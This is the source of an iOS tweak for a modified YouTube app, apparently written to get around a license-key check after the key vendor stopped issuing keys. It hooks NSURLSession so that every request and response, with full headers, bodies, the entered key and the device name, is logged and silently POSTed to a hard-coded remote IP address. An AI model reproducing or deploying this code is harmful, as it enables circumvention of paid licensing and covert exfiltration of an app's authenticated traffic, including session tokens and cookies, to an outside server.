// YouTube (亚马逊/TrollStore 版) —— 网络抓包诊断版 (Path B 验证)
//
// 目的: 作者已停发卡密。验证猜想"服务器根本不验卡密、直接下发 payload"。
//   submitTapped 只本地校验卡密长度==32，真正判定在服务器 (sub_1001D1478 走
//   NSURLSession POST)。所以输入任意 32 位字符提交，即可触发真实请求。
//
// 本版行为:
//   1. 【不自动跳过登录】—— 停在卡密界面，让你手动输 32 位任意卡密并提交。
//   2. 【不 hook submitTapped】—— 让真实验证网络请求正常发出。
//   3. 【hook NSURLSession dataTaskWithRequest:completionHandler:】—— 把
//      真实 URL、方法、请求头、请求体(卡密)、响应状态码、响应数据(hex+utf8)
//      全部落盘 + 上传到你的服务器，用来判断服务器是否下发 payload。
//
// 去授权版备份见 Tweak_deauth_working.xm.bak。
// 崩溃捕获/日志/上报基础设施沿用去授权版。

#import <UIKit/UIKit.h>
#import <objc/runtime.h>
#import <objc/message.h>
#import <execinfo.h>
#import <signal.h>
#import <pthread.h>
#import <fcntl.h>
#import <unistd.h>
#import <string.h>

// ====== 配置: 日志/抓包上报地址 ======
#define REPORT_URL @"http://159.75.14.193:8099/report"
#define REPORT_HOST_PREFIX @"http://159.75.14.193:8099"

// ====== 日志文件路径 ======
static NSString *logPath(void) {
    return [NSTemporaryDirectory() stringByAppendingPathComponent:@"ytunlock.log"];
}
static NSString *prevLogPath(void) {
    return [NSTemporaryDirectory() stringByAppendingPathComponent:@"ytunlock.prev.log"];
}

static void rawAppend(const char *line) {
    @try {
        NSString *p = logPath();
        int fd = open([p fileSystemRepresentation], O_WRONLY | O_CREAT | O_APPEND, 0644);
        if (fd >= 0) {
            write(fd, line, strlen(line));
            write(fd, "\n", 1);
            close(fd);
        }
    } @catch (__unused id e) {}
}

static void YLOGf(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSString *line = [NSString stringWithFormat:@"[YTNet] %@", s];
    NSLog(@"%@", line);
    rawAppend([line UTF8String]);
}
#define YLOG(...) YLOGf(__VA_ARGS__)

// ====== 崩溃捕获 ======
static void writeBacktrace(const char *reason) {
    rawAppend("========== CRASH ==========");
    rawAppend(reason);
    void *cs[64];
    int n = backtrace(cs, 64);
    char **syms = backtrace_symbols(cs, n);
    if (syms) {
        for (int i = 0; i < n; i++) rawAppend(syms[i]);
        free(syms);
    }
    rawAppend("========== END CRASH ==========");
}
static void sigHandler(int sig) {
    char buf[64];
    snprintf(buf, sizeof(buf), "FATAL SIGNAL %d", sig);
    writeBacktrace(buf);
    signal(sig, SIG_DFL);
    raise(sig);
}
static void excHandler(NSException *e) {
    @try {
        NSString *r = [NSString stringWithFormat:@"NSException: %@ | %@\n%@",
                       e.name, e.reason, [e.callStackSymbols componentsJoinedByString:@"\n"]];
        rawAppend("========== NSEXCEPTION ==========");
        rawAppend([r UTF8String]);
        rawAppend("========== END NSEXCEPTION ==========");
    } @catch (__unused id x) {}
}
static void installCrashHandlers(void) {
    NSSetUncaughtExceptionHandler(&excHandler);
    int sigs[] = {SIGSEGV, SIGABRT, SIGBUS, SIGILL, SIGTRAP, SIGFPE};
    for (int i = 0; i < 6; i++) signal(sigs[i], &sigHandler);
}

// ====== 上报: 把某文件内容 POST 到服务器 ======
static void reportFile(NSString *path, NSString *tag) {
    @try {
        NSData *data = [NSData dataWithContentsOfFile:path];
        if (!data || data.length == 0) return;
        NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:REPORT_URL]];
        req.HTTPMethod = @"POST";
        req.HTTPBody = data;
        [req setValue:@"text/plain" forHTTPHeaderField:@"Content-Type"];
        NSString *dev = [[UIDevice currentDevice] name];
        NSString *sys = [[UIDevice currentDevice] systemVersion];
        [req setValue:[NSString stringWithFormat:@"%@-%@", dev, sys] forHTTPHeaderField:@"X-Device"];
        [req setValue:tag forHTTPHeaderField:@"X-Tag"];
        NSURLSession *s = [NSURLSession sessionWithConfiguration:
                           [NSURLSessionConfiguration ephemeralSessionConfiguration]];
        NSURLSessionDataTask *t = [s dataTaskWithRequest:req
            completionHandler:^(NSData *d, NSURLResponse *r, NSError *err) {
                YLOG(@"report(%@) -> %@", tag, err ? err.localizedDescription : @"sent");
            }];
        [t resume];
    } @catch (id e) {
        NSLog(@"[YTNet] reportFile exception %@", e);
    }
}

// 直接上报一段字符串(不落盘也发)，tag 区分。用 ephemeral session 避免被我们自己 hook 再触发。
static void reportString(NSString *body, NSString *tag) {
    @try {
        NSData *data = [body dataUsingEncoding:NSUTF8StringEncoding];
        if (!data) return;
        NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:REPORT_URL]];
        req.HTTPMethod = @"POST";
        req.HTTPBody = data;
        [req setValue:@"text/plain" forHTTPHeaderField:@"Content-Type"];
        NSString *dev = [[UIDevice currentDevice] name];
        NSString *sys = [[UIDevice currentDevice] systemVersion];
        [req setValue:[NSString stringWithFormat:@"%@-%@", dev, sys] forHTTPHeaderField:@"X-Device"];
        [req setValue:tag forHTTPHeaderField:@"X-Tag"];
        NSURLSession *s = [NSURLSession sessionWithConfiguration:
                           [NSURLSessionConfiguration ephemeralSessionConfiguration]];
        [[s dataTaskWithRequest:req completionHandler:^(NSData *d, NSURLResponse *r, NSError *err) {}] resume];
    } @catch (__unused id e) {}
}

static void rotateAndReportPrevious(void) {
    @try {
        NSFileManager *fm = [NSFileManager defaultManager];
        NSString *cur = logPath(), *prev = prevLogPath();
        if ([fm fileExistsAtPath:cur]) {
            [fm removeItemAtPath:prev error:nil];
            [fm moveItemAtPath:cur toPath:prev error:nil];
        }
        rawAppend("");
        YLOG(@"==== new session %@ (NET-CAPTURE build) ====", [NSDate date]);
        if ([fm fileExistsAtPath:prev]) reportFile(prev, @"prev-session");
    } @catch (__unused id e) {}
}

// ====== 抓包工具: 把 NSData dump 成 hex + 尝试 utf8 ======
static NSString *dumpData(NSData *d, NSUInteger maxBytes) {
    if (!d) return @"(nil)";
    NSUInteger n = d.length;
    NSUInteger show = n < maxBytes ? n : maxBytes;
    const unsigned char *b = (const unsigned char *)d.bytes;
    NSMutableString *hex = [NSMutableString stringWithCapacity:show * 3];
    for (NSUInteger i = 0; i < show; i++) [hex appendFormat:@"%02x", b[i]];
    NSString *utf8 = [[NSString alloc] initWithData:[d subdataWithRange:NSMakeRange(0, show)]
                                           encoding:NSUTF8StringEncoding];
    return [NSString stringWithFormat:@"len=%lu%@\n  hex: %@\n  utf8: %@",
            (unsigned long)n, (n > show ? @"(truncated)" : @""), hex,
            utf8 ? utf8 : @"(non-utf8)"];
}

static NSString *describeRequest(NSURLRequest *req) {
    NSMutableString *s = [NSMutableString string];
    @try {
        [s appendFormat:@"URL: %@\n", req.URL.absoluteString ?: @"(nil)"];
        [s appendFormat:@"Method: %@\n", req.HTTPMethod ?: @"(nil)"];
        [s appendFormat:@"Timeout: %.1f\n", req.timeoutInterval];
        NSDictionary *h = req.allHTTPHeaderFields;
        [s appendFormat:@"Headers(%lu):\n", (unsigned long)h.count];
        for (NSString *k in h) [s appendFormat:@"  %@: %@\n", k, h[k]];
        NSData *body = req.HTTPBody;
        [s appendFormat:@"Body: %@\n", dumpData(body, 4096)];
    } @catch (id e) { [s appendFormat:@"(describeRequest exc %@)\n", e]; }
    return s;
}

// ====== hook NSURLSession dataTaskWithRequest:completionHandler: ======
// 真正实现常在私有子类 __NSURLSessionLocal 上，逐候选类 hook。
typedef NSURLSessionDataTask * (*DataTaskIMP)(id, SEL, NSURLRequest *,
        void (^)(NSData *, NSURLResponse *, NSError *));

static NSMutableSet *gHooked = nil;

static void hookDataTaskOnClass(Class cls) {
    if (!cls) return;
    SEL sel = @selector(dataTaskWithRequest:completionHandler:);
    Method m = class_getInstanceMethod(cls, sel);
    if (!m) return;
    if (!gHooked) gHooked = [NSMutableSet set];
    NSString *tag = NSStringFromClass(cls);
    if ([gHooked containsObject:tag]) return;
    [gHooked addObject:tag];

    DataTaskIMP orig = (DataTaskIMP)method_getImplementation(m);
    IMP repl = imp_implementationWithBlock(^NSURLSessionDataTask *(id self_,
            NSURLRequest *req, void (^ch)(NSData *, NSURLResponse *, NSError *)) {
        NSString *url = req.URL.absoluteString ?: @"";
        BOOL isSelfReport = [url hasPrefix:REPORT_HOST_PREFIX];
        if (!isSelfReport) {
            NSString *desc = describeRequest(req);
            YLOG(@"==> REQUEST (%@)\n%@", tag, desc);
            reportString([NSString stringWithFormat:@"==> REQUEST (%@)\n%@", tag, desc], @"net-req");
        }
        void (^wrapped)(NSData *, NSURLResponse *, NSError *) =
            ^(NSData *data, NSURLResponse *resp, NSError *err) {
                if (!isSelfReport) {
                    @try {
                        long code = -1;
                        NSString *rhdr = @"";
                        if ([resp isKindOfClass:[NSHTTPURLResponse class]]) {
                            NSHTTPURLResponse *hr = (NSHTTPURLResponse *)resp;
                            code = (long)hr.statusCode;
                            NSMutableString *hs = [NSMutableString string];
                            for (id k in hr.allHeaderFields) [hs appendFormat:@"  %@: %@\n", k, hr.allHeaderFields[k]];
                            rhdr = hs;
                        }
                        NSString *rep = [NSString stringWithFormat:
                            @"<== RESPONSE url=%@\n  status=%ld err=%@\n  respHeaders:\n%@  body: %@",
                            url, code, err ? err.localizedDescription : @"(none)",
                            rhdr, dumpData(data, 8192)];
                        YLOG(@"%@", rep);
                        reportString(rep, @"net-resp");
                    } @catch (__unused id e) {}
                }
                if (ch) ch(data, resp, err);
            };
        return orig(self_, sel, req, ch ? wrapped : ch);
    });
    method_setImplementation(m, repl);
    YLOG(@"hooked dataTaskWithRequest:completionHandler: on %@", tag);
}

static void installNetworkHooks(void) {
    const char *names[] = {
        "__NSURLSessionLocal", "__NSCFURLSession", "NSURLSession", NULL
    };
    for (int i = 0; names[i]; i++) hookDataTaskOnClass(objc_getClass(names[i]));
    @try {
        NSURLSession *s = [NSURLSession sessionWithConfiguration:
                           [NSURLSessionConfiguration defaultSessionConfiguration]];
        hookDataTaskOnClass(object_getClass(s));
        NSURLSession *sh = [NSURLSession sharedSession];
        hookDataTaskOnClass(object_getClass(sh));
    } @catch (__unused id e) {}
}

%ctor {
    installCrashHandlers();
    rotateAndReportPrevious();
    @try {
        YLOG(@"ctor start (NET-CAPTURE, no auto-skip login)");
        installNetworkHooks();
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.5 * NSEC_PER_SEC)),
                       dispatch_get_main_queue(), ^{
            installNetworkHooks();
            YLOG(@"late network hook pass done");
        });
        YLOG(@"ctor done");
    } @catch (id e) {
        YLOG(@"ctor exception: %@", e);
    }
}
